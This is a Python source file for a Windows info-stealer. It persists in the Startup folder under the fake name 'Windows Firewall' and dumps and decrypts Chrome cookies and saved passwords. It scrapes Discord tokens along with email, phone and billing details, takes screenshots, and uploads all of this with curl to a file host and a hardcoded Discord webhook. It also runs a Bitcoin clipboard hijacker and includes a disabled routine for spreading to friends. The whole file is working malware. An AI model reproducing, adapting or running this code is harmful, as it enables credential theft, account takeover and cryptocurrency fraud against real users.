import os
if os.name == "nt":
    pass
else:
    exit()
from json import loads, dumps
from re import findall
from urllib.request import Request, urlopen
from winregistry import WinRegistry as Reg
from subprocess import Popen, PIPE
import random
from PIL import ImageGrab
import ctypes
import sys
import getpass
import re
import subprocess
from os import environ, path
from win32crypt import CryptUnprotectData
import json
import base64
import sqlite3
import browser_cookie3
import time
import logging
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta
from base64 import b64decode

# Configuration
BTC_ADDRESS = ''
webhookURL = "https://discord.com/api/webhooks/851299535376744508/0wT-ybEeehPndErZKpgWxIULAU9VJG-odOXiW5jyd4OM1-xy0Tw0UkkQQXDMfMRr2s6W"
hiddenWindow = False
FakeFileName = "Windows Firewall"

# Defining needed variables
path = path.join(
    environ["USERPROFILE"],
    "AppData",
    "Local",
    "Google",
    "Chrome",
    "User Data",
    "Default",
    "Login Data",
)
myname = str(sys.argv[0])
USER_NAME = getpass.getuser()
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

class Clipboard:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
        self.kernel32.GlobalLock.restype = ctypes.c_void_p
        self.kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

        self.user32 = ctypes.windll.user32
        self.user32.GetClipboardData.restype = ctypes.c_void_p

    def __enter__(self):
        self.user32.OpenClipboard(0)
        if self.user32.IsClipboardFormatAvailable(1):
            data  = self.user32.GetClipboardData(1)
            data_locked = self.kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            self.kernel32.GlobalUnlock(data_locked)

            try:
                return value.decode()

            except Exception as e:
                return ''

    def __exit__(self, exc_type, exc_value, exc_traceback):
        self.user32.CloseClipboard()

class Methods:
    regex = '^(bc1|[13])[a-zA-HJ-NP-Z0-9]+'

    @staticmethod
    def set_clipboard(text):
        return subprocess.check_call('echo %s |clip' % text.strip() , shell=True)

    def check(self, text):
        try:
            regex_check = re.findall(self.regex, text)
            if regex_check:
                return True
        except Exception as e:
            return False

class Logger():
    def startup():
        if ".py" in myname:
            return
        else:
            try:
                shutil.copy2(myname, fr'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{FakeFileName}.exe' % USER_NAME)
                file_path = myname
                if file_path == "":
                    file_path = os.path.dirname(os.path.realpath(__file__))
                bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
                with open(bat_path + '\\' + f"{FakeFileName}.bat", "w+") as bat_file:
                    bat_file.write(r'start "" %s' % file_path)
                    os.system(f"attrib +h {FakeFileName}.bat" )
                    bat_file.close()
            except Exception as e:
                print(e)
    def cookieLog():
        cookies = list(browser_cookie3.chrome())
        f = open("rc.txt","w+")
        os.system("attrib +h rc.txt")
        for item in cookies:
                f.write("%s\n" % item)
    def passwordLog():
        try:
            def get_chrome_datetime(chromedate):
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

            def get_encryption_key():
                local_state_path = os.path.join(os.environ["USERPROFILE"],
                                                "AppData", "Local", "Google", "Chrome",
                                                "User Data", "Local State")
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)

                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                key = key[5:]
                return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

            def decrypt_password(password, key):
                try:
                    iv = password[3:15]
                    password = password[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    return cipher.decrypt(password)[:-16].decode()
                except:
                    try:
                        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                    except:
                        return ""

            key = get_encryption_key()
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "default", "Login Data")
            filename = "ChromeData.db"
            shutil.copyfile(db_path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            passwordFile = open("psd.txt", "a")
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_password(row[3], key)
                row[4]
                row[5]
                if username or password:
                    passwordFile.write(f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}" + "\n" + "-" * 50 + "\n")
                else:
                    continue
            cursor.close()
            db.close()
            try:
                os.remove(filename)
            except:
                pass
            os.system("attrib +h psd.txt")
        except Exception as e:
            print(e)
    def uploadFiles():
        # Get screenshot
        try:
            screen = ImageGrab.grab()
            screen.save(os.getenv('ProgramData') + r'\desktop.jpg')
            screen = open(r'C:\ProgramData\desktop.jpg', 'rb')
            screen.close()
            screenshotRaw = os.popen('curl -F "file=@C:\ProgramData\desktop.jpg" https://store9.gofile.io/uploadFile ').read()
            screenshotUploaded = f"[Desktop Image]({screenshotRaw[39:65]})"
        except Exception as e:
            print(e)
            screenshotUploaded = "Desktop Image: N/A"
        # Cookies
        try:
            cookiesRaw = os.popen('curl -F "file=@rc.txt" https://store9.gofile.io/uploadFile').read()
            cookiesUploaded = f"[Cookies]({cookiesRaw[39:65]})"
            os.remove("rc.txt")
        except Exception as e:
            print(e)
            cookiesUploaded = "Cookies: N/A"

        # Passwords
        try:
            passwordsRaw = os.popen('curl -F "file=@psd.txt" https://store9.gofile.io/uploadFile').read()
            global passwordsUploaded
            passwordsUploaded = f"[Passwords]({passwordsRaw[39:65]})"
            os.remove("psd.txt")
        except Exception as e:
            print(e)
            passwordsUploaded = "Passwords: N/A"

        # Finalize Logger
        def getheaders(token=None, content_type="application/json"):
            headers = {
                "Content-Type": content_type,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
            }
            if token:
                headers.update({"Authorization": token})
            return headers
        def getuserdata(token):
            try:
                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
            except:
                pass
        def gettokens(path):
            path += "\\Local Storage\\leveldb"
            tokens = []
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            tokens.append(token)
            return tokens
        def getip():
            ip = "None"
            try:
                ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
            except:
                pass
            return ip
        def getavatar(uid, aid):
            url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
            try:
                urlopen(Request(url))
            except:
                url = url[:-4]
            return url
        def gethwid():
            p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
        def getfriends(token):
            try:
                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
            except:
                pass
        def getchat(token, uid):
            try:
                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
            except:
                pass
        def has_payment_methods(token):
            try:
                return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
            except:
                pass
        def send_message(token, chat_id, form_data):
            try:
                urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
            except:
                pass
        def spread(token, form_data, delay):
            return
            for friend in getfriends(token):
                try:
                    chat_id = getchat(token, friend["id"])
                    send_message(token, chat_id, form_data)
                except Exception as e:
                    pass
                sleep(delay)
        cache_path = ROAMING + "\\.cache~$"
        embeds = []
        working = []
        checked = []
        already_cached_tokens = []
        working_ids = []
        ip = getip()
        pc_username = os.getenv("UserName")
        pc_name = os.getenv("COMPUTERNAME")
        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue
            for token in gettokens(path):
                if token in checked:
                    continue
                checked.append(token)
                uid = None
                if not token.startswith("mfa."):
                    try:
                        uid = b64decode(token.split(".")[0].encode()).decode()
                    except:
                        pass
                    if not uid or uid in working_ids:
                        continue
                user_data = getuserdata(token)
                if not user_data:
                    continue
                working_ids.append(uid)
                working.append(token)
                username = user_data["username"] + "#" + str(user_data["discriminator"])
                user_id = user_data["id"]
                avatar_id = user_data["avatar"]
                avatar_url = getavatar(user_id, avatar_id)
                email = user_data.get("email")
                phone = user_data.get("phone")
                nitro = bool(user_data.get("premium_type"))
                billing = bool(has_payment_methods(token))
                locationOfIP = "https://whatismyipaddress.com/ip/" + ip
                reg = Reg()
                path = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001'
                hwid = str(reg.read_value(path, 'HwProfileGuid')).split("'")[7]
                getColor = [0x1abc9c, 0x11806a, 0x2ecc71, 0x1f8b4c, 0x3498db, 0x206694, 0x9b59b6, 0x71368a, 0xe91e63, 0xad1457, 0xf1c40f, 0xc27c0e, 0xe67e22, 0xa84300, 0xe74c3c, 0x992d22, 0x95a5a6, 0x607d8b, 0x979c9f, 0x546e7a, 0x7289da, 0x99aab5]
                randomColor = random.choice(getColor)
                embed = {
                    "color": randomColor,
                    "fields": [
                        {
                            "name": "**Account Info**",
                            "value": f'Email: ||{email}||\nPhone: ||{phone}||\nNitro: {nitro}\nBilling Info: {billing}',
                            "inline": True
                        },
                        {
                            "name": "**PC Info**",
                            "value": f'IP: ||{ip}|| | [Location]({locationOfIP}) \nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                            "inline": True
                        },
                        {
                            "name": "**Token**",
                            "value": f"||{token}||",
                            "inline": False
                        },
                        {
                            "name": "**Logged Data**",
                            "value":  f"{cookiesUploaded} | {passwordsUploaded} | {screenshotUploaded}\n\nHwids:\n {gethwid()}\n{hwid}",
                            "inline": False
                        },
                    ],
                    "author": {
                        "name": f"{username} ({user_id})",
                        "icon_url": avatar_url
                    }
                }
                embeds.append(embed)
        with open(cache_path, "a") as file:
            for token in checked:
                if not token in already_cached_tokens:
                    file.write(token + "\n")
        if len(working) == 0:
            working.append('123')
        webhook = {
            "content": "",
            "embeds": embeds,
            "username": "Info Logger | github.com/localsgithub",
            "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
        }
        try:
            urlopen(Request(webhookURL, data=dumps(webhook).encode(), headers=getheaders()))
        except Exception as e:
            print(e)
    def btcClip():
        m = Methods()
        while True:
            with Clipboard() as clipboard:
                time.sleep(0.1)
                target_clipboard = clipboard
            if m.check(target_clipboard):
                m.set_clipboard(BTC_ADDRESS)
            time.sleep(1)
    def start():
        if hiddenWindow:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        else:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
        Logger.startup()
        Logger.cookieLog()
        Logger.passwordLog()
        Logger.uploadFiles()
        Logger.btcClip()

if __name__ == '__main__':
    Logger.start()
